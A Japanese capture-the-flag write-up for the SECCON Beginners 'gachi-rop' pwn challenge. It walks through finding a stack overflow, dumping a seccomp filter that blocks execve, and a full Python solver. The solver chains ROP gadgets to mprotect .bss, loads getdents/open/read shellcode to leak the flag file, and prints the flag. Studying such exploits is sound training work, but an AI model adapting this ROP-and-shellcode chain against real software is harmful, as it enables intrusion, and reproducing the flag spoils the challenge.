# gachi-rop

## 問題文
そろそろOne Gadgetにも飽きてきた？ガチROPの世界へようこそ！  
`nc gachi-rop.beginners.seccon.games 4567`  
[gachi-rop.tar.gz](files/gachi-rop.tar.gz) c8cb163daca67761d36d9410b6eb2d8bfa961c66  

## 難易度
**medium**  

## 作問にあたって
One Gadget派閥の台頭により、世界からROP筋が失われるのを防止しに来ました。  
私はPwnの師匠に「One GadgetはROPマスターしてから使うもの」、「Shell立ち上げて嬉しいことなんて実世界のExploitではほとんど無いよ」という厳しいお言葉を頂いています。  
seccompを知ってもらうのも問題の意図です(ちょっと意地悪しました)。  
ちなみにいろいろなところで既出です。  
人によってはgachi-shellcodeかもしれません。  

## 解法
動いているgachi-rop、libc.so.6と接続先が渡される。  
接続すると、`system`のアドレスが渡され、名前を聞かれて、応答があり終了する。  
```bash
$ nc gachi-rop.beginners.seccon.games 4567
system@0x7fb962266d70
Name: Satoki
Hello, gachi-rop-Satoki!!
```
配布されたgachi-ropをチェックする。  
```bash
$ checksec --file=gachi-rop
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   46 Symbols        No    0               2               gachi-rop
$ ./gachi-rop
system@0x7fc8d75c6d70
Name: Satoki
Hello, gachi-rop-Satoki!!
$ ./gachi-rop
system@0x7f5ef647bd70
Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Hello, gachi-rop-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!!
Segmentation fault
```
大量の入力で`Segmentation fault`となり、BOFが怪しい。  
```bash
$ gdb ./gachi-rop
~~~
pwndbg> start
~~~
pwndbg> c
Continuing.
system@0x7ffff7dccd70
Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Hello, gachi-rop-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!!
~~~
──────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────
 ► 0x4012a1 <main+134>    ret                                <0x4141414141414141>

~~~
───────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffdc98 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
... ↓        7 skipped
─────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────
 ► 0         0x4012a1 main+134
   1 0x4141414141414141
   2 0x4141414141414141
   3 0x4141414141414141
   4 0x4141414141414141
   5 0x4141414141414141
   6 0x4141414141414141
   7 0x4141414141414141
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```
RIPが取れている。  
あとは`system`のアドレスが表示されているため、libc内の`/bin/sh`などを使い`system`を呼び出せばよいと考える。  
しかし上手くいかない。  
それもそのはず、[seccomp-tools](https://github.com/david942j/seccomp-tools)で見てやると以下のように禁止項目がある。  
```bash
$ seccomp-tools dump ./gachi-rop
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x05 0xc000003e  if (A != ARCH_X86_64) goto 0007
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x03 0x00 0x40000000  if (A >= 0x40000000) goto 0007
 0004: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0007
 0005: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0007
 0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0007: 0x06 0x00 0x00 0x00050000  return ERRNO(0)
```
システムコール`execve`、`execveat`が禁止されており、簡単にシェルは取れないようになっている。  
もちろん`system`も内部でこれらを用いている。  
幸い、`read`や`open`が禁止されていないので、ファイルは読み取ることができる。  
フラグの場所を探すと、Dockerfileに`RUN  mv /flag.txt ctf4b/flag-$(md5sum /flag.txt | awk '{print $1}').txt`とある。  
つまり、ファイル名自体も取得する必要がある。  
`getdents`を使えば読み取ることができるので、以下のようにうまくROPして`mprotect`で実行可能領域を作り、シェルコードを挿入すればよい(シェルコードは[CTFするぞ](https://ptr-yudai.hatenablog.com/)から借りる)。  
```python
import os
from ptrlib import *

assert os.path.exists("./gachi-rop"), "./gachi-rop not found ;("
assert os.path.exists("./libc.so.6"), "./libc.so.6 not found ;("

elf = ELF("./gachi-rop")
libc = ELF("./libc.so.6")

sock = Socket("nc gachi-rop.beginners.seccon.games 4567")
# sock = Process("./gachi-rop")
# sock.debug = True

sock.recvuntil("system@")
libc.base = int(sock.recvline(), 16) - libc.symbol("system")

sock.recvuntil("Name: ")
payload = b"A" * 0x18
# mprotect(0x404000, 0x1000, 0x7)
payload += p64(next(libc.gadget("pop rdi; ret;")))
payload += p64(elf.section(".bss") & ~0xFFF)
payload += p64(next(libc.gadget("pop rsi; ret;")))
payload += p64(0x1000)
payload += p64(next(libc.gadget("pop rdx; pop r12; ret;")))
payload += p64(0x7)
payload += p64(0x0)  # X
payload += p64(libc.symbol("mprotect"))
# read(0x0, bss + 0x100, 0x200)
payload += p64(next(libc.gadget("pop rdi; ret;")))
payload += p64(0x0)
payload += p64(next(libc.gadget("pop rsi; ret;")))
payload += p64(elf.section(".bss") + 0x100)
payload += p64(next(libc.gadget("pop rdx; pop r12; ret;")))
payload += p64(0x200)
payload += p64(0x0)  # X
payload += p64(libc.symbol("read"))
# jmp bss + 0x100
payload += p64(next(libc.gadget("pop rax; ret;")))
payload += p64(elf.section(".bss") + 0x100)
payload += p64(next(libc.gadget("jmp rax;")))
sock.sendline(payload)

shellcode = nasm(
    f"""
    xor esi, esi
    lea rdi, [rel ctf4b]
    mov eax, {syscall.x64.open}
    syscall
    mov r13, rax
    cld

loop:
    mov edx, 0x40
    lea rsi, [rel buf]
    mov rdi, r13
    mov eax, {syscall.x64.getdents}
    syscall
    test eax, eax
    jz end

    mov dword [rel buf + 18 - 8], './ct'
    mov dword [rel buf + 18 - 4], 'f4b/'

    xor esi, esi
    lea rdi, [rel buf + 18 - 8]
    mov eax, {syscall.x64.open}
    syscall

    mov edx, 0x100
    lea rsi, [rel buf]
    mov edi, eax
    mov eax, {syscall.x64.read}
    syscall
    test rax, rax
    jle loop

    mov edx, eax
    mov edi, 1
    mov eax, {syscall.x64.write}
    syscall
    
    jmp loop

end:
    xor edi, edi
    mov eax, {syscall.x64.exit_group}
    syscall

ctf4b: db "./ctf4b", 0
buf:
""",
    bits=64,
)
sock.sendline(shellcode)

flag = sock.recvregex("ctf4b{.*?}")
print(flag.decode())
# sock.sh()
```
実行する。  
```
$ python solver.py
[+] __init__: Successfully connected to gachi-rop.beginners.seccon.games:4567
[+] base: New base address: 0x7fd5285d8000
ctf4b{64ch1_r0p_r3qu1r35_mu5cl3_3h3h3}
[+] _close_impl: Connection to gachi-rop.beginners.seccon.games:4567 closed
```
flagが得られた。  

## ctf4b{64ch1_r0p_r3qu1r35_mu5cl3_3h3h3}